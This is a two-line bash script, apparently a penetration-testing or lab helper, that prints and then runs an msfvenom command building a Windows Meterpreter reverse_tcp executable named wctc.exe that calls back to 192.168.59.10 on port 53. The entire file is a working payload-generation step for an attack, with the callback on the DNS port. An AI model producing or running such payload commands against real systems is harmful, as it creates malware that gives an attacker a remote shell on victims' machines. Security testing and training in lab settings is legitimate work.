#!/bin/bash

echo "msfvenom -p windows/meterpreter/reverse_tcp -f exe LHOST=192.168.59.10 LPORT=53 > wctc.exe"

msfvenom -p windows/meterpreter/reverse_tcp -f exe LHOST=192.168.59.10 LPORT=53 > wctc.exe
